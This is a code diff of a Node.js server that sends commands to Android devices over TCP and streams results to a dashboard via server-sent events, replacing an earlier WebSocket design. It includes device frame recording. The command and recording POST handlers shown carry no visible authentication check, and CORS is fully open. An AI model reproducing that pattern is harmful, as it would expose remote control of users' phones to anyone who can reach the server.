@@ -1,9 +1,8 @@
 // ============================================
 // ACCESS CONTROL SERVER
-// Unified TCP Protocol for Android + Dashboard
-// Protocol matches SocketManager.java exactly
-// Android: raw TCP (net.Socket)
-// Dashboard: WebSocket (TCP upgrade, same JSON protocol)
+// Android  → raw TCP  (net.Socket, port 6000)
+// Dashboard → HTTP SSE (GET /api/events, persistent TCP)
+//             HTTP POST (commands, ping — no WS, no queuing)
 // ============================================
 
 'use strict';
@@ -11,7 +10,6 @@
 const express  = require('express');
 const http     = require('http');
 const net      = require('net');
-const WebSocket = require('ws');
 const cors     = require('cors');
 const path     = require('path');
 const fs       = require('fs');
@@ -181,19 +179,19 @@ mongoose.connect(process.env.MONGODB_URI || process.env.MONGODB_URL || 'mongodb:
 
 // ============================================
 // STATE
-// Separate maps for TCP (Android) vs WS (Dashboard)
+// TCP for Android devices; SSE (HTTP) for Dashboard
 // ============================================
 /** @type {Map<string, net.Socket & {id:string, deviceId?:string, clientType:'android', lastPong:number, buf:string}>} */
 const tcpClients = new Map();          // connId → TCP socket
-/** @type {Map<string, WebSocket & {id:string, deviceId?:string, clientType:'dashboard', lastPong:number}>} */
-const wsClients  = new Map();          // clientId → WebSocket
+/** @type {Map<string, {res: import('express').Response, token:string}>} */
+const sseClients = new Map();          // clientId → { res, token }
 /** @type {Map<string, string>} */
 const deviceToTcp = new Map();         // deviceId → primary TCP connId
 /** @type {Map<string, string>} */
 const deviceToStreamTcp = new Map();   // deviceId → stream channel TCP connId
 /** @type {Map<string, string>} */
 const deviceToLiveTcp = new Map();     // deviceId → live channel TCP connId
-/** @type {Map<string, {wsId:string, command:string, deviceId:string, timer:NodeJS.Timeout}>} */
+/** @type {Map<string, {sseId:string, command:string, deviceId:string, timer:NodeJS.Timeout}>} */
 const pendingCmds = new Map();         // commandId → pending info
 /** @type {Map<string, Object>} In-memory device registry for when MongoDB is unavailable */
 const inMemoryDevices = new Map();     // deviceId → device object
@@ -222,17 +220,20 @@ function tcpSend(conn, event, data) {
     }
 }
 
-/** Send a protocol message to a WebSocket (Dashboard) client */
-function wsSend(ws, event, data) {
-    if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({ event, data }));
+/** Push a server-sent event to one specific SSE (Dashboard) client */
+function sseSend(clientId, event, data) {
+    const client = sseClients.get(clientId);
+    if (client && !client.res.writableEnded) {
+        client.res.write(`data: ${JSON.stringify({ event, data })}\n\n`);
     }
 }
 
-/** Broadcast an event to ALL connected dashboard WS clients */
+/** Broadcast an event to ALL connected SSE dashboard clients */
 function broadcastDash(event, data) {
-    for (const ws of wsClients.values()) {
-        wsSend(ws, event, data);
+    for (const [id, client] of sseClients) {
+        if (!client.res.writableEnded) {
+            client.res.write(`data: ${JSON.stringify({ event, data })}\n\n`);
+        }
     }
 }
 
@@ -427,129 +428,22 @@ async function processMessage(clientId, clientType, event, data) {
             );
         } catch (e) {}
 
-        // Route result to the waiting dashboard socket
+        // Route result to the waiting SSE dashboard client
         const pending = pendingCmds.get(commandId);
         if (pending) {
             clearTimeout(pending.timer);
             pendingCmds.delete(commandId);
 
-            const ws = wsClients.get(pending.wsId);
             const result = { commandId, command: pending.command, deviceId,
                              response, error: error || null, success: !error,
                              timestamp: new Date() };
-            if (ws) wsSend(ws, 'command:result', result);
+            if (pending.sseId) sseSend(pending.sseId, 'command:result', result);
 
-            // Also log to all dashboards
             broadcastDash('activity:log', {
                 type: 'command_result', deviceId, command: pending.command,
                 commandId, success: !error, timestamp: new Date()
             });
         }
-        return;
-    }
-
-    // ── Events expected from Dashboard (WS) ─────────────────────────
-    // ── Dashboard ping (latency measurement) ─────────────────────────
-    if (event === 'dashboard:ping') {
-        const ws = wsClients.get(clientId);
-        if (ws) wsSend(ws, 'dashboard:pong', { sentAt: data?.sentAt, serverAt: Date.now() });
-        return;
-    }
-
-    if (event === 'dashboard:get_devices') {
-        const ws = wsClients.get(clientId);
-        if (ws) await sendDeviceListTo(ws);
-        return;
-    }
-
-    if (event === 'commands:get_registry') {
-        const ws = wsClients.get(clientId);
-        if (ws) wsSend(ws, 'commands:registry', COMMANDS);
-        return;
-    }
-
-    if (event === 'recording:start') {
-        const { deviceId } = data || {};
-        if (!deviceId) return;
-        const recWs = wsClients.get(clientId);
-        if (!activeRecordings.has(deviceId)) {
-            activeRecordings.set(deviceId, { frames: [], startTime: Date.now() });
-        }
-        if (recWs) wsSend(recWs, 'recording:started', { deviceId });
-        return;
-    }
-
-    if (event === 'recording:stop') {
-        const { deviceId } = data || {};
-        if (!deviceId) return;
-        const recWs = wsClients.get(clientId);
-        const rec = activeRecordings.get(deviceId);
-        if (!rec) return;
-        activeRecordings.delete(deviceId);
-        try {
-            const deviceDir = path.join(RECORDINGS_DIR, deviceId.replace(/[^a-zA-Z0-9_-]/g, '_'));
-            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
-            const filename = `rec_${Date.now()}.json`;
-            const filePath = path.join(deviceDir, filename);
-            fs.writeFileSync(filePath, JSON.stringify({
-                deviceId,
-                startTime: rec.startTime,
-                endTime: Date.now(),
-                frameCount: rec.frames.length,
-                frames: rec.frames
-            }));
-            if (recWs) wsSend(recWs, 'recording:saved', { deviceId, filename, frameCount: rec.frames.length });
-        } catch (e) {
-            if (recWs) wsSend(recWs, 'recording:error', { deviceId, message: e.message });
-        }
-        return;
-    }
-
-    if (event === 'command:send') {
-        const { deviceId, command, params } = data || {};
-        const ws = wsClients.get(clientId);
-        if (!ws) return;
-
-        if (!deviceId || !command) {
-            wsSend(ws, 'command:error', { message: 'deviceId and command are required' });
-            return;
-        }
-        if (!COMMANDS[command]) {
-            wsSend(ws, 'command:error', { message: `Unknown command: ${command}` });
-            return;
-        }
-
-        // Find the TCP connection for this device
-        const tcpConnId = deviceToTcp.get(deviceId);
-        const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
-
-        if (!tcpConn || !tcpConn.writable) {
-            wsSend(ws, 'command:error', { commandId: null, message: 'Device is offline', deviceId, command });
-            return;
-        }
-
-        const commandId = crypto.randomBytes(12).toString('hex');
-
-        // Save to DB
-        try {
-            await new Command({ id: commandId, deviceId, command, data: params || {}, status: 'executing' }).save();
-        } catch (e) {}
-
-        // Forward to Android device via TCP (matching SocketManager.java processMessage)
-        tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });
-
-        // Track pending
-        const timer = setTimeout(() => {
-            if (pendingCmds.has(commandId)) {
-                pendingCmds.delete(commandId);
-                wsSend(ws, 'command:result', { commandId, command, deviceId,
-                    success: false, error: 'Command timed out', timestamp: new Date() });
-            }
-        }, CMD_TIMEOUT_MS);
-        pendingCmds.set(commandId, { wsId: clientId, command, deviceId, timer });
-
-        wsSend(ws, 'command:sent', { commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
-        log('CMD', `${command} → ${deviceId} [${commandId}]`);
         return;
     }
 
@@ -624,11 +518,10 @@ tcpServer.listen(TCP_PORT, '0.0.0.0', () =>
     log('TCP', `Android device server listening on 0.0.0.0:${TCP_PORT}`));
 
 // ============================================
-// HTTP + WEBSOCKET SERVER — Dashboard
+// HTTP SERVER — Dashboard (SSE + REST, no WebSocket)
 // ============================================
 const app    = express();
 const server = http.createServer(app);
-const wss    = new WebSocket.Server({ server, path: '/ws' });
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
@@ -688,36 +581,83 @@ app.post('/api/admin/verify', (req, res) => {
     return res.json({ success: true });
 });
 
-wss.on('connection', async (ws, req) => {
-    const id = crypto.randomBytes(8).toString('hex');
-    ws.id         = id;
-    ws.clientType = 'dashboard';
-    ws.lastPong   = Date.now();
-    wsClients.set(id, ws);
-    log('WS', `Dashboard connected ${id} from ${req.socket.remoteAddress}`);
+// ── SSE event stream — Dashboard persistent TCP push channel ─────────────────
+// Browser connects here with EventSource; server pushes newline-delimited JSON.
+// Each dashboard has an sseId used to route command results back to the right tab.
+app.get('/api/events', async (req, res) => {
+    const token = req.query.token;
+    if (!token || !global._adminTokens) return res.status(401).end();
+    const expiry = global._adminTokens.get(token);
+    if (!expiry || Date.now() > expiry) return res.status(401).end();
 
-    // Immediately send device list + command registry
-    await sendDeviceListTo(ws);
-    wsSend(ws, 'commands:registry', COMMANDS);
+    const clientId = crypto.randomBytes(8).toString('hex');
 
-    ws.on('message', (raw) => {
-        let msg;
-        try { msg = JSON.parse(raw.toString()); } catch (e) { return; }
-        processMessage(id, 'dashboard', msg.event, msg.data);
-    });
+    res.setHeader('Content-Type',  'text/event-stream');
+    res.setHeader('Cache-Control', 'no-cache');
+    res.setHeader('Connection',    'keep-alive');
+    res.setHeader('X-Accel-Buffering', 'no');  // disable nginx buffering
+    res.flushHeaders();
 
-    ws.on('pong', () => { ws.lastPong = Date.now(); });
+    sseClients.set(clientId, { res, token });
+    log('SSE', `Dashboard connected ${clientId}`);
 
-    ws.on('close', () => {
-        log('WS', `Dashboard disconnected ${id}`);
-        wsClients.delete(id);
-        // Clean up pending commands owned by this socket
+    // Immediately push device list + command registry
+    const list = await getDeviceList();
+    sseSend(clientId, 'device:list', list);
+    sseSend(clientId, 'commands:registry', COMMANDS);
+    // Tell the client its own sseId so it can include it in HTTP requests
+    sseSend(clientId, 'session:init', { sseClientId: clientId });
+
+    // Keep the connection alive with a comment every 25 s
+    const keepAlive = setInterval(() => {
+        if (!res.writableEnded) res.write(': ka\n\n');
+    }, 25000);
+
+    req.on('close', () => {
+        clearInterval(keepAlive);
+        sseClients.delete(clientId);
+        log('SSE', `Dashboard disconnected ${clientId}`);
         for (const [cid, p] of pendingCmds) {
-            if (p.wsId === id) { clearTimeout(p.timer); pendingCmds.delete(cid); }
+            if (p.sseId === clientId) { clearTimeout(p.timer); pendingCmds.delete(cid); }
         }
     });
+});
 
-    ws.on('error', (e) => log('WS', `Error on ${id}: ${e.message}`, 'error'));
+// ── Dashboard ping — measure server RTT over HTTP/TCP ────────────────────────
+app.post('/api/dashboard/ping', (req, res) => {
+    res.json({ sentAt: req.body?.sentAt ?? null, serverAt: Date.now() });
+});
+
+// ── Recording start/stop via HTTP ─────────────────────────────────────────────
+app.post('/api/recordings/:deviceId/start', (req, res) => {
+    const { deviceId } = req.params;
+    if (!activeRecordings.has(deviceId)) {
+        activeRecordings.set(deviceId, { frames: [], startTime: Date.now() });
+    }
+    broadcastDash('recording:started', { deviceId });
+    res.json({ success: true, deviceId });
+});
+
+app.post('/api/recordings/:deviceId/stop', (req, res) => {
+    const { deviceId } = req.params;
+    const rec = activeRecordings.get(deviceId);
+    if (!rec) return res.status(404).json({ success: false, error: 'No active recording' });
+    activeRecordings.delete(deviceId);
+    try {
+        const deviceDir = path.join(RECORDINGS_DIR, deviceId.replace(/[^a-zA-Z0-9_-]/g, '_'));
+        if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+        const filename = `rec_${Date.now()}.json`;
+        const filePath = path.join(deviceDir, filename);
+        fs.writeFileSync(filePath, JSON.stringify({
+            deviceId, startTime: rec.startTime, endTime: Date.now(),
+            frameCount: rec.frames.length, frames: rec.frames
+        }));
+        broadcastDash('recording:saved', { deviceId, filename, frameCount: rec.frames.length });
+        res.json({ success: true, deviceId, filename, frameCount: rec.frames.length });
+    } catch (e) {
+        broadcastDash('recording:error', { deviceId, message: e.message });
+        res.status(500).json({ success: false, error: e.message });
+    }
 });
 
 // ============================================
@@ -739,7 +679,7 @@ app.get('/api/devices/:deviceId', async (req, res) => {
 });
 
 app.post('/api/commands', async (req, res) => {
-    const { deviceId, command, params } = req.body;
+    const { deviceId, command, params, sseClientId } = req.body;
     if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
     if (!COMMANDS[command]) return res.status(400).json({ error: `Unknown command: ${command}` });
 
@@ -748,10 +688,27 @@ app.post('/api/commands', async (req, res) => {
     if (!tcpConn || !tcpConn.writable) return res.status(503).json({ error: 'Device offline', deviceId });
 
     const commandId = crypto.randomBytes(12).toString('hex');
+
+    // Forward to device immediately — no queue, fire and forget over TCP
     tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });
 
+    // Track pending so command:response can route the result back via SSE
+    const timer = setTimeout(() => {
+        if (pendingCmds.has(commandId)) {
+            pendingCmds.delete(commandId);
+            if (sseClientId) sseSend(sseClientId, 'command:result', {
+                commandId, command, deviceId, success: false,
+                error: 'Command timed out', timestamp: new Date()
+            });
+        }
+    }, CMD_TIMEOUT_MS);
+    pendingCmds.set(commandId, { sseId: sseClientId || null, command, deviceId, timer });
+
     try { await new Command({ id: commandId, deviceId, command, data: params || {}, status: 'executing' }).save(); } catch (e) {}
-    res.json({ success: true, commandId, status: 'executing' });
+
+    // Respond immediately so the browser isn't blocked waiting
+    res.json({ success: true, commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
+    log('CMD', `${command} → ${deviceId} [${commandId}]`);
 });
 
 app.get('/api/commands/registry', (req, res) => res.json({ success: true, commands: COMMANDS }));
@@ -765,7 +722,7 @@ app.get('/api/health', async (req, res) => {
             ? `connected (${redisStats.onlineDevices} online / ${redisStats.totalDevices} total devices, mem: ${redisStats.memoryUsed})`
             : `disconnected${redisStats.error ? ' — ' + redisStats.error : ''}`,
         tcpClients: tcpClients.size,
-        wsClients: wsClients.size,
+        sseClients: sseClients.size,
         connectedDevices: deviceToTcp.size,
         pendingCommands: pendingCmds.size,
         tcpPort: TCP_PORT,
@@ -863,11 +820,6 @@ async function broadcastDeviceList() {
     broadcastDash('device:list', list);
 }
 
-async function sendDeviceListTo(ws) {
-    const list = await getDeviceList();
-    wsSend(ws, 'device:list', list);
-}
-
 // ============================================
 // PERIODIC TASKS
 // ============================================
@@ -876,13 +828,6 @@ async function sendDeviceListTo(ws) {
 setInterval(() => {
     for (const conn of tcpClients.values()) {
         if (conn.writable) tcpSend(conn, 'device:ping', { timestamp: Date.now() });
-    }
-}, PING_INTERVAL);
-
-// Ping WS clients (dashboards)
-setInterval(() => {
-    for (const ws of wsClients.values()) {
-        if (ws.readyState === WebSocket.OPEN) ws.ping();
     }
 }, PING_INTERVAL);
 
@@ -946,7 +891,7 @@ server.on('error', (err) => {
 R.init().then(() => {
     server.listen(HTTP_PORT, () => {
         log('HTTP', `Server running on port ${HTTP_PORT}`);
-        log('HTTP', `Dashboard → ws://localhost:${HTTP_PORT}/ws`);
+        log('HTTP', `Dashboard → http://localhost:${HTTP_PORT}  (SSE: GET /api/events)`);
         log('TCP',  `Android devices → localhost:${TCP_PORT}`);
         if (!process.env.REDIS_URL) {
             log('REDIS', 'REDIS_URL not configured — skipping Redis (in-memory only)', 'warn');
@@ -956,7 +901,7 @@ R.init().then(() => {
     log('REDIS', `Init error: ${err.message} — starting without Redis`, 'warn');
     server.listen(HTTP_PORT, () => {
         log('HTTP', `Server running on port ${HTTP_PORT}`);
-        log('HTTP', `Dashboard → ws://localhost:${HTTP_PORT}/ws`);
+        log('HTTP', `Dashboard → http://localhost:${HTTP_PORT}  (SSE: GET /api/events)`);
         log('TCP',  `Android devices → localhost:${TCP_PORT}`);
     });
 });
@@ -971,4 +916,4 @@ async function gracefulShutdown(signal) {
 process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
 process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
 
-module.exports = { app, server, wss };
+module.exports = { app, server };
